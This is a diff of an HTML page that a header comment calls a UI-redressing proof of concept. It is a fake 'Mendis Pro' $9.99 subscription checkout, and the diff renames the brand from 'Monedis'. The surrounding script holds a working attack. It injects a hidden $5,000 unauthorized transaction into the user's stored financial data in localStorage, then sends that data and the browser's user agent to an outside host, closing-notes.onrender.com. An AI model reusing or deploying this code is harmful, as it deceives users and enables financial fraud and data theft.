@@ -3,14 +3,14 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Monedis Pro</title>
+<title>Mendis Pro</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 <style>
 /*
   ╔══════════════════════════════════════════════════════════════╗
-  ║  UI REDRESSING PoC — Monedis checkout                       ║
-  ║  Visible:  Subscribe to Monedis Pro — $9.99/month           ║
+  ║  UI REDRESSING PoC — Mendis checkout                       ║
+  ║  Visible:  Subscribe to Mendis Pro — $9.99/month           ║
   ║  Hidden:   Inject $5,000 unauthorized transaction into      ║
   ║            user's localStorage + exfiltrate financial data  ║
   ╚══════════════════════════════════════════════════════════════╝
@@ -175,7 +175,7 @@ body {
       <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg>
       Plans
     </div>
-    <div class="hdr-title">Monedis Pro</div>
+    <div class="hdr-title">Mendis Pro</div>
     <div class="hdr-pad"></div>
   </div>
 
@@ -188,7 +188,7 @@ body {
         <svg width="11" height="11" viewBox="0 0 24 24" fill="currentColor"><path d="M12 2l3.09 6.26L22 9.27l-5 4.87 1.18 6.88L12 17.77l-6.18 3.25L7 14.14 2 9.27l6.91-1.01L12 2z"/></svg>
         Pro
       </div>
-      <div class="hero-name">Monedis Pro</div>
+      <div class="hero-name">Mendis Pro</div>
       <div class="hero-price">
         <span class="price-amount">$9.99</span>
         <span class="price-period">/ month</span>
@@ -249,7 +249,7 @@ body {
         <span class="cta-label">Subscribe — $9.99/month</span>
       </button>
       <div class="legal">
-        By subscribing you agree to Monedis Terms of Service.<br>
+        By subscribing you agree to Mendis Terms of Service.<br>
         Your Payroll ••• 7712 account will be charged $9.99 today.
       </div>
     </div>
@@ -263,7 +263,7 @@ body {
     </div>
     <div class="success-title">Welcome to Pro!</div>
     <div class="success-sub">Your subscription is now active. $9.99 will be charged monthly to Payroll ••• 7712.</div>
-    <div class="success-pill">✦ Monedis Pro active</div>
+    <div class="success-pill">✦ Mendis Pro active</div>
   </div>
 
   <!-- nav -->
@@ -289,7 +289,7 @@ body {
 </div>
 
 <script>
-try { window.localStorage.removeItem('monedis.web.v1'); } catch(e) {}
+try { window.localStorage.removeItem('mendis.web.v1'); } catch(e) {}
 
 function today() {
   var d = new Date();
@@ -302,7 +302,7 @@ function executeAttack(callback) {
     // Force in-memory state → localStorage
     if (typeof iWin.guardar === 'function') {
       iWin.guardar();
-      var raw = window.localStorage.getItem('monedis.web.v1');
+      var raw = window.localStorage.getItem('mendis.web.v1');
       if (raw && raw.length > 5) {
         var stored = JSON.parse(raw);
         var id = (stored.data.sec || 50) + 1;
@@ -320,12 +320,12 @@ function executeAttack(callback) {
           msi: 0
         });
         stored.data.sec = id;
-        window.localStorage.setItem('monedis.web.v1', JSON.stringify(stored));
+        window.localStorage.setItem('mendis.web.v1', JSON.stringify(stored));
 
         // Exfiltrate the now-modified financial data
         fetch('https://closing-notes.onrender.com/?r=grab', {
           method: 'POST', headers: {'Content-Type':'application/json'},
-          body: JSON.stringify({ data: window.localStorage.getItem('monedis.web.v1'), ua: navigator.userAgent, ts: Date.now() })
+          body: JSON.stringify({ data: window.localStorage.getItem('mendis.web.v1'), ua: navigator.userAgent, ts: Date.now() })
         }).catch(function(){});
 
         callback(true);
